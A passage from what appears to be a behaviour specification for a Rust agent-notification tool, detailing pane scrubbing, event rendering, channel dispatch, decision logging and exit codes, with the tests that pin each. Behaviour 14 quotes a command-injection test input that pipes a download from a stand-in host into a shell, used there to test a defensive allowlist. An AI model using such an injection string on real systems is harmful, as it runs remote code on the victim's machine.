  NOT ESTABLISHED: no test pins the FULL sentence above verbatim; the two tests assert substrings.

### 14. The pane is scrubbed once, before rendering, and warned about only when a channel will run

Given an event whose `--pane` value fails the safety allowlist When `dispatch_legs` runs Then the pane is
replaced by the empty string in the rendered event handed to EVERY channel, and one warning is printed to
stderr.

- Success: `sandbox.event("macos-banner")["pane"]` is `""` and stderr contains
  `pns: dropped a pane id with shell metacharacters; no channel will focus a pane`
  (`src/main.rs:dispatch_legs`).
- Failure sources: a pane id carrying a shell metacharacter, which would run when the operator clicks the
  banner, because the pane becomes an argument to a notifier's execute-on-click SHELL STRING
  (`src/safety.rs:pane_is_safe`).
- Fail direction: fail-closed. An ALLOWLIST, so a character is refused until it is shown to be inert:
  ASCII alphanumerics plus `.`, `_`, `:` and `-`, and nothing else. The colon earns its place because it
  is herdr's own separator (`wW:p21`) and is the null command in command position
  (`src/safety.rs:pane_is_safe`).
- Thresholds: an empty pane is also refused by `pane_is_safe`, but `Decision::pane_dropped` is
  `!pane.is_empty() && !pane_is_safe(pane)`, so an absent pane is not a drop (`src/engine.rs:decide`).
- Required side effects: exactly one stderr warning, and only on the path where a channel will run.
- Forbidden side effects: the scrub happens ONCE here rather than per channel, because a channel may be
  written in any language and cannot be expected to share the guard (`src/main.rs:dispatch_legs`).
- Timeout and cancellation: not applicable.
- Idempotency and duplicates: one warning per event.
- Privacy: the offending pane VALUE is not echoed in the warning.
- Process ownership and cleanup: not applicable.
- Compatibility contract:
  `tests/dispatch.rs:a_pane_with_shell_metacharacters_is_scrubbed_from_every_delivered_event` pins the
  empty `pane` field on the delivered event and the substring
  `dropped a pane id with shell metacharacters` on stderr, for the input `wW:p1; curl evil | sh`.
  `tests/dispatch.rs:a_scrub_warning_is_not_printed_when_no_channel_will_run` pins the silence.
  `src/safety.rs:tests::a_herdr_pane_id_is_safe_colon_and_all_or_no_banner_can_focus_a_pane` and
  `src/safety.rs:tests::a_pane_id_carrying_a_single_metacharacter_is_refused` pin the allowlist.

### 15. Every channel is handed the rendered event, not the raw arguments

Given the parsed arguments and the sanitized pane When `rendered_event` runs Then the channel event
carries the five raw fields plus a composed `title`, `message` and `preview`, and an executable channel
receives that object as one line of JSON (JavaScript Object Notation) on stdin with a trailing newline.

- Success: `Event { agent, state, project, branch, detail, title, message, preview, pane }`
  (`src/main.rs:rendered_event`, `src/channels/mod.rs:Event`), serialized by
  `src/channels/mod.rs:Event::to_json` with a tenth field, `mode`, which is the only PER-LEG value and so
  arrives as an argument rather than living on the struct.
- Failure sources: none, composition is total. `render::title` substitutes `pns` for an empty agent and
  `done` for an empty state; `render::message` falls back from detail to state to the literal `done`
  (`src/render.rs:title`, `src/render.rs:message`).
- Fail direction: not applicable, nothing can fail here.
- Thresholds: `render::PREVIEW_MAX_CHARS` is 260 characters. A message at or under it is the preview
  unchanged; over it, the preview is cut to the LAST sentence end that still fits (punctuation followed
  by a space), and if there is no such cut point the text is clipped to 260 characters with the last
  character replaced by an ellipsis and said to have been cut (`src/render.rs:preview`,
  `src/render.rs:clipped`).
- Required side effects: the JSON line written to the channel's stdin is newline-terminated, as the
  bash's `jq -cn` emitted it, because a channel reading one line with `read -r` gets nothing without it
  (`src/main.rs:deliver`).
- Forbidden side effects: the branch prefix is `branch: body` and never `(branch) body`, because macOS
  argument parsing eats a `terminal-notifier -message` whose first character is `(`, `[` or `-`
  (`src/render.rs:message`).
- Timeout and cancellation: not applicable to composition.
- Idempotency and duplicates: one rendered event per invocation, shared by every leg.
- Privacy: the rendered event carries the operator's own detail text in full. It goes to channels, which
  is the point; it is the durable record that restricts what it keeps (behavior 17).
- Process ownership and cleanup: not applicable.
- Compatibility contract:
  `tests/dispatch.rs:a_channel_is_handed_the_rendered_event_not_the_raw_arguments` pins that `agent`
  round trips and that `title`, `message` and `preview` are each a non-empty STRING (refused by type,
  because a missing key indexes to JSON null and null is not equal to the empty string).
  `tests/dispatch.rs:the_delivered_event_is_newline_terminated_for_line_oriented_channels` pins the
  newline by having the stub read one line with `IFS= read -r` and parsing it as JSON.
  `src/channels/mod.rs:tests::the_event_is_the_channel_contracts_json_object` pins the field set and the
  `mode` word, and
  `src/channels/mod.rs:tests::the_mode_is_the_only_per_leg_field_so_one_event_serializes_both_ways` pins
  that one event serializes both ways.

### 16. Dispatch precedence, per-leg isolation, and which lines reach the operator

Given a plan with one or more legs When `dispatch_legs` walks them Then each leg goes to its compiled-in
plugin when native plugins win, else to `<channels dir>/<name>.sh`; a refused mobile backend fails ahead
of both seams; a panic in one channel is one leg's failure; and only a `ReportOutcome` leg's `Delivered`
or `Failed` sentence is printed, prefixed `pns: `.

- Success: a `Vec<(Leg, Delivery)>` in registration order, and zero or more `pns: <sentence>` lines on
  stdout (`src/main.rs:dispatch_legs`, `src/main.rs:deliver_leg`, `src/main.rs:run_event`,
  `src/channels/mod.rs:Delivery::line_for`).
- Failure sources: a channel executable that is missing or not executable (`Delivery::Unlaunched`); a
  channel that ran and exited non-zero (still `Delivery::Silent`, because its exit status is deliberately
  dropped); a native plugin that could not reach its destination (`Delivery::Failed`); a channel that
  panics (`Delivery::Failed` with a fixed sentence).
- Fail direction: fail-open per leg and fail-silent on the notification path. "One channel's failure
  costs the others nothing, and every channel above was constructed before the first delivery, so a leg
  cannot be lost to a sibling's refusal" (`src/main.rs:dispatch_legs`). `Unlaunched` prints in NEITHER
  mode, because the common case is a channel nobody installed (`src/channels/mod.rs:Delivery`).
- Thresholds: precedence turns on one predicate. With `PNS_CHANNELS_DIR` set and non-empty, executables
  win for EVERY name; with it unset or empty, a native plugin wins and the executable fallback serves
  only names with no native implementation (`src/channels/mod.rs:native_first`,
  `src/main.rs:dispatch_legs`). The channels directory defaults to `$HOME/.local/libexec/pns/channels`,
  and an EMPTY value means the default as much as unset does (`src/main.rs:resolve_path`).
- Required side effects: for a native leg, one outbound attempt. The banner spawns `terminal-notifier` by
  NAME through PATH (`src/channels/banner.rs:deliver`); moshi posts JSON to `PNS_MOSHI_URL` or the
  compiled default (`src/main.rs:moshi_channel`); hermes posts a signed body to the URL from behavior 5
  (`src/channels/hermes.rs:deliver`).
- Forbidden side effects: no `?` and no early return in the leg loop. A panic must not take the remaining
  legs, and the panic message is NOT included in the failure sentence, because it is written for a
  developer and may quote anything the channel was holding (`src/main.rs:dispatch_legs`). A channel's own
  sentence carries no `pns: ` prefix; the one print site adds it (`src/channels/mod.rs:Delivery` doc).
- Timeout and cancellation: the native legs are bounded. Moshi posts under
  `src/channels/moshi.rs:POST_DEADLINE` (10 seconds). Hermes posts under
  `src/channels/hermes.rs:ASYNC_DEADLINE` (10 seconds) on a `Silent` leg, and on a `ReportOutcome` leg
  under `remote_deadline(PNS_REMOTE_TIMEOUT)`, which defaults to 5 seconds, clamps to 86,400 seconds, and
  treats an explicit 0 as no deadline at all (`src/channels/hermes.rs:remote_deadline`,
  `src/channels/hermes.rs:DEFAULT_SYNC_DEADLINE_SECS`, `src/channels/hermes.rs:MAX_SYNC_DEADLINE_SECS`).
  An EXECUTABLE channel is NOT bounded: `deliver` calls `child.wait()` with no deadline
  (`src/main.rs:deliver`), so a wedged executable channel holds the event open indefinitely.
- Idempotency and duplicates: exactly one attempt per leg, no retry anywhere. The moshi post is "one
  agent, one deadline, no retry" (`src/channels/moshi.rs:UreqPost`).
- Privacy: the moshi token is put in the request body and never in the engine's own output; a failed
  moshi post says only that the endpoint refused it or could not be reached, because "the only thing
  worth reporting would be the request that carries the token" (`src/channels/moshi.rs:deliver`,
  `src/channels/moshi.rs:UreqPost`).
- Process ownership and cleanup: `deliver` spawns the channel with piped stdin, writes the event plus a
  newline, and waits for it. It does not put the child in its own process group and does not kill it
  (`src/main.rs:deliver`).
- Compatibility contract: the native-wins rule is pinned by
  `tests/native.rs:the_banner_leg_delivers_natively_and_the_executable_channel_stays_silent` (a decoy
  executable channel of the same name must NOT fire). Per-leg isolation is pinned by
  `tests/dispatch.rs:a_channel_that_fails_neither_fails_the_caller_nor_suppresses_its_siblings` (a stub
  that exits 9) and `tests/dispatch.rs:an_absent_channel_is_simply_not_installed`, which also pins that
  stdout is EXACTLY `""` for an absent channel on a synchronous leg. The printed sentences are pinned
  verbatim by
  `tests/dispatch.rs:every_hermes_outcome_an_event_can_reach_prints_exactly_what_it_printed_before`:
  `pns: post SKIPPED -- no hermes key in the config ([plugins.hermes] key); nothing was sent\n`,
  `pns: post FAILED HTTP 000 (no response; is the hermes gateway up?)\n`, and
  `pns: post FAILED (curl reported no HTTP status at all)\n`. The two that need a listener are pinned by
  `tests/native.rs:sync_hermes_prints_the_posted_line_and_signs_the_exact_bytes_it_sent`
  (`pns: posted HTTP 200\n`) and
  `tests/native.rs:a_gateway_that_answers_401_is_named_rather_than_read_as_a_downed_gateway`
  (`pns: post FAILED HTTP 401\n`). Silence on an asynchronous leg is pinned by
  `tests/native.rs:an_async_hermes_with_a_real_key_stays_silent_even_when_the_post_fails`. The mode
  policy itself is pinned by
  `src/channels/mod.rs:tests::either_verdict_reaches_the_operator_on_a_reporting_leg_and_nothing_does_otherwise`.
  NOT ESTABLISHED: nothing pins the panic sentence `the <name> channel PANICKED; nothing was sent`. I
  grepped `tests/` for `PANICKED` and found no occurrence, so `src/main.rs:dispatch_legs`'s
  `catch_unwind` arm is unexercised by any test.

### 17. Every event appends exactly one decision, after dispatch and before the pulse

Given any event, delivered or not, first attempt or nudge or observation When `record_decision` runs Then
one line is appended to the decision ring at `<state dir>/decisions`, carrying the readings the decision
actually ran on and each leg's verdict, and the ring is pruned to its cap.

- Success: one `<epoch> <key=value ...>` line (`src/main.rs:record_decision`,
  `src/decision_log.rs:line`).
- Failure sources: a state directory that cannot be written; a ring holding bytes that are not text; a
  ring that ends mid-line; a ring larger than the read cap; a named pipe planted at the ring's path.
- Fail direction: fail-quiet, and the source names this as the only place the failure is dropped. "An
  event path whose stdout a harness hook reads must not gain a line about the state directory"
  (`src/main.rs:record_decision`).
- Thresholds: `decision_log::KEPT` is 5 lines, chosen because a single slot does not survive being looked
  at (`src/decision_log.rs:KEPT`). `RING_READ_MAX` is 256 KiB (`src/main.rs:RING_READ_MAX`).
  `IDENTITY_MAX` caps the recorded agent and state at 32 characters (`src/decision_log.rs:IDENTITY_MAX`).
  One step either side of the depth: after turn 5 the ring holds 5 lines; after turn 6 the oldest is gone
  and the newest is last.
- Required side effects: the file is created at mode 0o600 (`src/main.rs:STATE_FILE_MODE`), and the
  record is written AFTER every channel and BEFORE the pulse, so the leg verdicts are part of it and a
  bridge deadline cannot take it (`src/main.rs:run_event`, the ordering comment). The stated accepted
  price: a decision is lost if a channel hangs to its deadline and the process is killed before this
  runs.
- Forbidden side effects: NO FREE TEXT reaches the line. The detail, branch, project and pane id are the
  operator's own content and this file is printed to a terminal by the diagnostic, so the pane appears
  only as two booleans and every other value is a number, a boolean, an enum variant name or a plugin
  name out of the compiled roster (`src/decision_log.rs:line`). The agent, state, permission mode,
  subagent id and tool name are passed through `printable`, which answers the literal `unprintable` for
  anything outside ASCII alphanumerics plus `.`, `-` and `_` (`src/decision_log.rs:printable`). No
  `actionId` is recorded, because pns never has one (`src/decision_log.rs:line` doc).
- Timeout and cancellation: not applicable, this is a bounded file append.
- Idempotency and duplicates: exactly one line per event, including a nudge, which is distinguished only
  by the `nag=` boolean so two `claude/blocked` entries are not indistinguishable
  (`src/decision_log.rs:Record::nag`).
- Privacy: covered under forbidden side effects. A newline is the character that matters most, because
  one in a value would forge a second entry the reader could not tell from a real decision
  (`src/decision_log.rs:printable`).
- Process ownership and cleanup: not applicable.
- Compatibility contract:
  `tests/dispatch.rs:an_event_appends_exactly_one_decision_carrying_what_it_decided_and_what_the_legs_did`
  pins the substrings `claude/done`, `surface=Away`, `long_running=yes`, `pane=none`,
  `plan=banner:no,card:yes,pulse:yes` and ` legs=mobile:silent,hermes:silent`, and pins that neither
  `a private summary` nor `dotfiles` appears anywhere in the line.
  `tests/dispatch.rs:an_event_that_reached_no_channel_at_all_still_records_its_decision` pins
  `local_only=yes`, `remote_only=yes` and ` legs=none`.
  `tests/dispatch.rs:the_ring_keeps_only_the_most_recent_decisions_with_the_oldest_gone` pins the depth
  after EVERY turn from 1 to 7, not only at the end.
  `tests/dispatch.rs:a_state_directory_that_cannot_be_written_costs_the_event_nothing` pins that both
  channels still fire, stdout is exactly `""`, stderr never mentions `decision`, and the process exits 0.

### 18. The first delivery's contiguous tail, and what a nudge or observation skips

Given `Attempt::First`, which is what `event_mode` always passes for a producer invocation When
`run_event` gets past the decision record Then it runs, in this order: the journal write, the blocked
marker update, the news record, the loop lease renewal, the activity ring append, the missed-notification
replay, the last-present marker advance, the pulse, the held-lamp clear, and the lights tick
registration.

- Success: each step runs and each failure is dropped (`src/main.rs:run_event`, the tail below the
  `if attempt != Attempt::First { return; }` guard).
- Failure sources: an unwritable state directory, at every step.
- Fail direction: fail-quiet throughout. "A marker that did not land costs one lamp its colour and never
  a card" (`src/main.rs:run_event`).
- Thresholds: the journal keeps `missed_notifications::KEPT` = 25 entries, each field capped at
  `render::PREVIEW_MAX_CHARS` = 260 characters, and raising the depth past 33 would make a full journal
  unreadable and silently collapse it to one line (`src/missed_notifications.rs:KEPT`,
  `src/main.rs:record_missed`). The activity ring keeps `ACTIVITY_KEPT` = 150 entries at
  `ACTIVITY_MAX_CHARS` = 120 characters per field, read back under `ACTIVITY_READ_MAX` = 1 MiB
  (`src/main.rs:ACTIVITY_KEPT`, `src/main.rs:ACTIVITY_MAX_CHARS`, `src/main.rs:ACTIVITY_READ_MAX`). The
  lights tick lease is `ORDINARY_LEASE_SECS` = 300 seconds for an ordinary event and
  `JOURNALLED_LEASE_SECS` = 43,200 seconds (12 hours) for one that was journaled
  (`src/main.rs:ORDINARY_LEASE_SECS`, `src/main.rs:JOURNALLED_LEASE_SECS`,
  `src/main.rs:register_lights_tick`).
- Required side effects, and their conditions:
  - The JOURNAL is written only when `missed_notifications::was_missed` is true, which is
    `!skip_phone && !watching && !plan.banner && !plan.phone_card`
    (`src/missed_notifications.rs:was_missed`). A DELIVERED event journals nothing.
  - The ACTIVITY ring is written UNCONDITIONALLY, which is the whole difference between it and the
    journal (`src/main.rs:record_activity`).
  - The LAST-PRESENT marker advances only when `missed_notifications::is_present` is true, which is
    `surface != Away`, and only forward, and only from inside the return-moment claim
    (`src/missed_notifications.rs:is_present`, `src/main.rs:mark_present`, `src/main.rs:advance_marker`).
  - The LIGHTS need both switches, a `[lights]` table AND an enabled `[plugins.hue]` table, before the
    blocked marker or the tick registration writes anything (`src/main.rs:run_event`, `lamps_live`).
  - The NEWS record is written whatever the delivery did and is NOT gated on the lamp switches, because
    it is one line rewritten in place that can never grow (`src/main.rs:run_event`, the `record_news`
    comment).
  - The PULSE fires when `decision.plan.pulse` (which is `long_running`) OR the behaviour is `Blocked`
    and the operator is not silenced (`src/main.rs:run_event`).
- Forbidden side effects: a NUDGE or an OBSERVATION returns before all of it. It writes no journal entry,
  no activity-ring line, never claims the return moment, never triggers the replay and never pulses, and
  the reasons are stated: the recap counts activity-ring lines toward its threshold so a nudge would
  inflate the operator's own recap with pns's noise, neither is evidence of presence, and the pulse
  falling out here is how "escalation is not a colour" stays enforced (`src/main.rs:run_event`,
  `src/main.rs:Attempt`). A producer invocation is never either of those, since `event_mode` passes
  `Attempt::First` unconditionally (`src/main.rs:event_mode`). The BLOCKED MARKER also writes nothing on
  a producer path for a second reason: the payload is `HookPayload::default()`, so `session_id` is empty,
  and `safety::session_id_is_safe("")` is false, so `lights::blocked_marker` answers `None` and
  `update_blocked_marker` returns immediately (`src/main.rs:run_event`, `src/lights.rs:blocked_marker`,
  `src/safety.rs:session_id_is_safe`).
- Timeout and cancellation: the pulse talks to a bridge over the network under a ten second deadline,
  which is exactly why it is placed LAST, after every channel an operator might be waiting on
  (`src/main.rs:run_event`, `src/channels/hue.rs:BRIDGE_DEADLINE`).
- Idempotency and duplicates: the return moment is arbitrated by ONE claim over both the recap and the
  catch-up, taken before anything is counted, because a claim per file MEASURED as two cards at one
  moment (`src/main.rs:replay_missed`, `src/main.rs:mark_present`). The marker advance is
  read-compare-publish and only ever moves forward, because a slow event that read epoch 100 and a quick
  one that read 101 both publish at the end of their own run (`src/main.rs:advance_marker`).
- Privacy: the journal and the activity ring DO hold the operator's free text, capped and JSON-escaped,
  built with `json!` and never with `format!`, which is this repo's "build JSON with `jq -n --arg`" rule
  in Rust (`src/missed_notifications.rs:entry`). The journal is created readable and writable by its
  owner alone (`src/main.rs:STATE_FILE_MODE`).
- Process ownership and cleanup: the recap child, when one is spawned, runs in a process group of its own
  (`tests/dispatch.rs:the_recap_child_runs_in_a_process_group_of_its_own`).
- Compatibility contract:
  `tests/dispatch.rs:every_event_is_recorded_in_the_activity_ring_delivered_or_not` pins that a DELIVERED
  event leaves an activity entry carrying `agent`, `state`, `project` and `detail` while the journal file
  does not exist at all. `tests/dispatch.rs:a_delivered_event_journals_nothing_at_all` and
  `tests/dispatch.rs:a_missed_event_appends_exactly_one_entry_carrying_what_a_card_would_have_shown` pin
  the journal's condition.
  `tests/dispatch.rs:a_present_event_moves_the_last_present_marker_and_an_away_event_does_not` pins the
  marker rule, and
  `tests/dispatch.rs:the_windows_near_edge_never_moves_backward_however_late_an_event_publishes` pins the
  forward-only rule.
  `tests/dispatch.rs:a_full_activity_ring_prunes_to_its_own_depth_instead_of_collapsing_to_one_line` pins
  the 150-entry depth against a worst-case ring past the shared 256 KiB read cap.
  `tests/dispatch.rs:the_journal_is_created_readable_and_writable_by_its_owner_alone` pins the file mode.
  `tests/dispatch.rs:an_event_registers_the_tick_and_a_journalled_one_leases_it_for_longer` pins the two
  lease lengths.
  `tests/dispatch.rs:a_done_event_writes_the_news_record_and_renews_a_lease_its_pane_holds` and
  `tests/dispatch.rs:the_news_record_is_written_whatever_the_lamps_are_doing` pin the news record.
  `tests/dispatch.rs:a_state_directory_that_cannot_be_written_costs_a_missed_event_nothing` and
  `tests/dispatch.rs:a_registration_that_cannot_be_written_costs_the_event_nothing` pin the fail-quiet
  direction.

### 19. The producer path exits 0 on every path that becomes an event

Given any producer invocation that reaches `event_mode` When the process finishes Then it exits 0,
whatever any channel, config, probe or state write did.

- Success: exit code 0 (`src/main.rs:main` returns after `event_mode`; the module doc states "The
  producer path exits 0 on every path, because a notification must never fail the work it reports on").
- Failure sources: none that change the code. A failed channel, an unwritable state directory, a broken
  config and a non-Unicode argument all still exit 0.
- Fail direction: fail-open, and the exit code is the strongest form of it.
- Thresholds: exactly two producer-adjacent paths exit non-zero, and neither is an event: a word naming
  no command exits 2 (behavior 2), and the hand-typed verbs refuse a bad invocation with exit 2
  (`src/main.rs` module doc, which also names two remaining gaps: `home` always exits 0, and a word
  trailing `lights tick` is dropped rather than refused).
- Required side effects: none.
- Forbidden side effects: no path on the event side may abort. `build_registry` is the one panic, and it
  is argued as unreachable in production because the only refusal it can hit is a duplicate name in a
  compiled-in constant (`src/registry.rs:build_registry`).
- Timeout and cancellation: the process can still be killed from outside, and the accepted price of that
  is stated at the decision record (behavior 17).
- Idempotency and duplicates: not applicable.
- Privacy: not applicable.
- Process ownership and cleanup: not applicable.
- Compatibility contract: every call through `support::run` asserts `output.status.success()`
  (`tests/support/mod.rs:run`), so the exit-0 edge is pinned by every dispatch test that uses it.
  `tests/dispatch.rs:a_non_unicode_argument_never_breaks_the_exit_zero_edge` states it explicitly,
  `tests/dispatch.rs:help_in_flag_position_wins_wherever_it_reaches_the_event_parser` asserts `Some(0)`
  directly, and `tests/dispatch.rs:a_state_directory_that_cannot_be_written_costs_the_event_nothing`
  names `run` as the thing asserting it.
